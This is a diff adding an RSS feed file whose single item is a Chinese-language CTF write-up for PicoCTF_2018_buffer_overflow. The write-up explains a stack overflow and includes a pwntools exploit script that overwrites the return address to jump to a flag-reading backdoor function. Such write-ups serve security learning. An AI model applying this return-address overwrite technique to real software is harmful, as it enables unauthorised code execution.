@@ -1,0 +1,46 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>Blog • Posts by &#34;栈溢出&#34; category</title>
+        <link>https://vvwwvv.cn</link>
+        <description></description>
+        <language>zh-CN</language>
+        <pubDate>Sun, 24 Sep 2023 17:08:15 +0800</pubDate>
+        <lastBuildDate>Sun, 24 Sep 2023 17:08:15 +0800</lastBuildDate>
+        <category>Java</category>
+        <category>pwn</category>
+        <category>二进制</category>
+        <category>Linux</category>
+        <category>C语言</category>
+        <category>windows</category>
+        <category>渗透</category>
+        <category>ret2csu</category>
+        <category>fastbin.attack</category>
+        <category>ctf</category>
+        <category>系统调用</category>
+        <category>nc</category>
+        <item>
+            <guid isPermalink="true">https://vvwwvv.cn/2023/09/24/pwn/%E5%88%B7%E9%A2%98/BUUCTF/PicoCTF_2018_buffer_overflow/</guid>
+            <title>PicoCTF_2018_buffer_overflow（栈溢出）</title>
+            <link>https://vvwwvv.cn/2023/09/24/pwn/%E5%88%B7%E9%A2%98/BUUCTF/PicoCTF_2018_buffer_overflow/</link>
+            <category>pwn</category>
+            <pubDate>Sun, 24 Sep 2023 17:08:15 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;1查看程序信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1查看程序信息&#34;&gt;#&lt;/a&gt; 1. 查看程序信息&lt;/h1&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/26/pPH8ckT.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
+32 位程序，保护几乎都没开启&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/26/pPH82hF.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;查看 vuln 函数，发现 &lt;code&gt;v0&lt;/code&gt;  为 &lt;code&gt;eax&lt;/code&gt; （不过没什么用），查看一下汇编&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/26/pPH8f1J.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/26/pPH84XR.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;发现有个后门函数可以读取 flag 文件&lt;br /&gt;
+&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/26/pPH8btO.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;利用栈溢出返回到该地址即可&lt;/p&gt;
+&lt;h1 id=&#34;2exp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2exp&#34;&gt;#&lt;/a&gt; 2.exp:&lt;/h1&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;span&gt;n&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; LibcSearcher &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#context.log_level = &#39;debug&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;context&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;os&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;linux&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arch&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;amd64&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; log_level&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;debug&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;process&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;./PicoCTF_2018_buffer_overflow_1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#e=ELF(&#39;./&#39;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#p=remote(&#39;node4.buuoj.cn&#39;,28249)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#shellcode = asm(shellcraft.sh())&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;string: \n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload1&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#34;a&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x28&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x80485CB&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#+p32()+p32()+p32()&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;interactive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;本地：&lt;br /&gt;
+&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/26/pPHGk9g.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;远程：&lt;br /&gt;
+&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/26/pPHJlZt.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
